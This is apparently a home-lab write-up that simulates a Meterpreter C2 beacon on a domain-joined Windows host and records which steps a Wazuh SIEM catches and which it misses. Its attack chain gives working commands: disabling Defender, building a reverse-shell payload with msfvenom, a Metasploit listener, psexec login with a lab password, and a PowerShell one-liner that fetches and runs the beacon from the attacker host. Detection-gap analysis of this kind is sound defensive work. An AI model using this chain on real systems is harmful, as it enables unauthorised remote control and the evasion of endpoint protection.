**Date:** May 25, 2026  
**Lab:** Home Lab — Proxmox / Wazuh SIEM / Active Directory / Kali  
**Author:** Jacob King ([JacobKing15](https://github.com/JacobKing15))  
**Series:** [Wazuh Attack & Detect Lab Series](#)

---

## Objective

Simulate a Command and Control (C2) beacon being deployed to a compromised Windows endpoint and observe what Wazuh detects. This sim builds directly on Sim 2 (Pass-the-Hash / Lateral Movement) — the attacker already has valid credentials for a domain user and uses them to deliver a Meterpreter payload remotely.

---

## Environment

| Host | IP | Role |
|------|----|------|
| Kali Linux | 192.168.1.102 | Attacker |
| Win10-Victim | 192.168.1.101 | Target (domain-joined, LAB\jsmith) |
| DC01 | 192.168.1.100 | Domain Controller (lab.local) |
| Wazuh SIEM | 192.168.1.95 | Detection |

**Tools used:** msfvenom, Metasploit multi/handler, impacket-psexec, Python HTTP server

---

## MITRE ATT&CK Coverage

| Technique | ID | Tactic |
|-----------|----|--------|
| Valid Accounts | T1078 | Initial Access / Privilege Escalation |
| SMB/Windows Admin Shares | T1021.002 | Lateral Movement |
| System Services: Service Execution | T1569.002 | Execution |
| Ingress Tool Transfer | T1105 | Command and Control |
| PowerShell | T1059.001 | Execution |
| Non-Application Layer Protocol | T1095 | Command and Control |

---

## Baseline — Wazuh Before the Attack

<img width="1280" height="602" alt="baseline" src="https://github.com/user-attachments/assets/ae0a706c-d5e0-41e4-9c67-4d2065431def" />

Clean state: 91 low-level alerts (logon/logoff activity), zero high-severity alerts, MITRE showing only Valid Accounts. This is the before picture.

---

## Attack Chain

### Step 1 — Disable Windows Defender on Target

Before deploying the payload, Windows Defender needed to be disabled on the victim. Defender's **Tamper Protection** blocked the PowerShell command initially:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Returns False — Tamper Protection is blocking it
```

**Fix:** Navigated to Windows Security → Virus & threat protection → Manage settings → disabled Tamper Protection manually, then re-ran the command.

<img width="1084" height="648" alt="disabledefender" src="https://github.com/user-attachments/assets/9a87fc83-1345-419e-821e-648942c849f6" />

> **Detection note:** Wazuh logged this as a Domain Policy Modification event and updated the MITRE wheel before the attack even started. Defender tampering is detectable.

---

### Step 2 — Build the Payload (Kali)

Generated a stageless Meterpreter reverse shell payload using msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.102 LPORT=4444 \
  -f exe -o /tmp/beacon.exe
```

<img width="1280" height="855" alt="beaconcreated" src="https://github.com/user-attachments/assets/99c70f99-c97a-45b6-9c7e-de211249a33d" />

---

### Step 3 — Host the Payload and Set Up Listener (Kali)

**Terminal 1 — HTTP server to serve the payload:**
```bash
cd /tmp && python3 -m http.server 8080
```

**Terminal 2 — Metasploit listener:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.102
set LPORT 4444
run
# [+] Started reverse TCP handler on 192.168.1.102:4444
```

<img width="1280" height="694" alt="httpserv8080" src="https://github.com/user-attachments/assets/a88aa84f-d341-4a54-b05a-cf33a7626e31" />

---

### Step 4 — Remote Delivery via impacket-psexec (Kali)

Rather than logging into the victim manually, the payload was delivered remotely using impacket-psexec with jsmith's credentials (obtained in Sim 1 — brute force). This is the realistic attack path: compromised credentials → remote execution, no physical access required.

```bash
impacket-psexec lab.local/jsmith:'Password1!'@192.168.1.101
```

impacket-psexec:
1. Located the writable ADMIN$ share on 192.168.1.101
2. Uploaded a service binary via SMB
3. Created a new Windows service (random name) to execute it
4. Opened a SYSTEM-level shell on the victim

Once the shell opened, the beacon was downloaded and executed:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.102:8080/beacon.exe','C:\beacon.exe'); C:\beacon.exe"
```

The Python HTTP server logged: `GET /beacon.exe HTTP/1.1" 200`

---

### Step 5 — Meterpreter Session Established

<img width="1280" height="712" alt="psexecshellmet" src="https://github.com/user-attachments/assets/b85cc89b-dee9-49dc-82db-80306e4d890e" />

Msfconsole confirmed the session:

```
[*] Sending stage (244806 bytes) to 192.168.1.101
[*] Meterpreter session 1 opened (192.168.1.102:4444 → 192.168.1.101:55034) at 2026-05-25 14:34:25
```

Session recon:

<img width="897" height="942" alt="metsysinfo" src="https://github.com/user-attachments/assets/3960d710-6afd-471e-8c55-33dd0b0394e8" />

```
meterpreter > sysinfo
Computer    : DESKTOP-DRJDHLP
OS          : Windows 10 22H2+ (10.0 Build 19045)
Domain      : LAB
Meterpreter : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**The beacon was running as SYSTEM** — psexec's service execution mechanism escalated from jsmith (standard domain user) to full SYSTEM privileges automatically. No separate privilege escalation step was needed.

---

## Wazuh Detection Results

### What Was Caught ✅

<img width="1280" height="610" alt="1lvl12" src="https://github.com/user-attachments/assets/0ff73773-c366-4c58-baf4-e7bf8b8e9af5" />

The dashboard immediately showed the level 12 alert firing at 14:34, along with new MITRE tactics appearing: Pass the Hash, SMB/Windows Admin Shares, Service Execution, Domain Policy Modification.

**Rule 92650 — Level 12 (High)**

<img width="950" height="836" alt="9625doc" src="https://github.com/user-attachments/assets/77e7b0f0-9168-4da2-815b-64242f486d85" />

> *"New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares."*

| Field | Value |
|-------|-------|
| rule.id | 92650 |
| rule.level | 12 |
| rule.mitre.id | T1021.002, T1569.002 |
| rule.mitre.tactic | Lateral Movement, Execution |
| rule.mitre.technique | SMB/Windows Admin Shares, Service Execution |
| Timestamp | 2026-05-25 @ 14:34:00 |
| Provider | Service Control Manager |

Wazuh saw the Service Control Manager log a new service created from the Windows root path — a hallmark of psexec-style attacks. The rule correctly identified the SMB Admin Share delivery + Service Execution pattern and fired a level 12 alert.

**Domain Policy Modification** (pre-attack)  
Wazuh also detected the disabling of Windows Defender (via Tamper Protection bypass) and logged it as a Domain Policy Modification event before the attack chain even began.

---

### What Was Missed ❌

**Meterpreter C2 channel — not detected**

Searched Wazuh Events for the outbound C2 connection:

Queries that returned zero results:
- `data.win.eventdata.destinationPort: 4444`
- `data.win.eventdata.Image: beacon.exe`
- `4444`

Wazuh had no visibility into:
- The outbound TCP connection from Win10-Victim to Kali on port 4444
- The beacon.exe process running in memory
- Ongoing C2 communication

**Root cause:** Wazuh's default Windows agent configuration does not capture network connection events. Sysmon with a network logging configuration (Event ID 3 — Network Connection) is required to log outbound connections at the process level.

---

## Detection Gap Analysis

| Event | Detected | Why |
|-------|----------|-----|
| Defender tampered (Tamper Protection bypass) | ✅ | Windows Security audit log |
| psexec service creation via ADMIN$ | ✅ | Service Control Manager + Wazuh rule 92650 |
| beacon.exe downloaded via HTTP | ❌ | No network logging |
| beacon.exe executed | ❌ | No process creation logging (Sysmon needed) |
| Meterpreter C2 channel (TCP 4444) | ❌ | No Sysmon Event ID 3 |
| Ongoing C2 activity / commands run | ❌ | No network/process telemetry |

---

## Recommended Detection Improvements

1. **Deploy Sysmon on Windows endpoints** with a configuration that captures:
   - Event ID 1 (Process Creation) — would catch beacon.exe launching
   - Event ID 3 (Network Connection) — would log the outbound connection to 192.168.1.102:4444
   - Event ID 11 (File Creation) — would log beacon.exe being dropped to C:\

2. **Write a Wazuh rule** to alert on unexpected outbound connections from non-browser processes to unusual ports (4444, 4445, 8443, etc.)

3. **Alert on non-standard service names** — psexec creates services with random names (e.g., `gjhr`). A rule matching new services with random-looking names from the root path would catch this even without Sysmon.

---

## Key Takeaways

- **psexec via ADMIN$ is loud.** Wazuh caught it without any custom tuning — rule 92650 fired immediately at level 12. SMB-based lateral movement is well-covered by default Wazuh rules.
- **C2 channels are invisible without network telemetry.** The delivery was caught; the ongoing communication was not. An attacker who gets past the initial delivery is effectively undetected without Sysmon.
- **psexec gives SYSTEM.** Using jsmith's standard domain account, the attacker ended up with NT AUTHORITY\SYSTEM via service execution. No separate privilege escalation step was needed.
- **Defender tamper is a signal.** Wazuh logged the Tamper Protection bypass before the attack started. In a real SOC, that alone should trigger investigation.

---

## Related Sims

- [Sim 1 — Brute Force (SMB / RDP)](#)
- [Sim 2 — Pass-the-Hash / Lateral Movement](#)
- [Sim 3 — Persistence (Scheduled Task + Registry)](#)
- Sim 5 — Privilege Escalation *(coming next)*
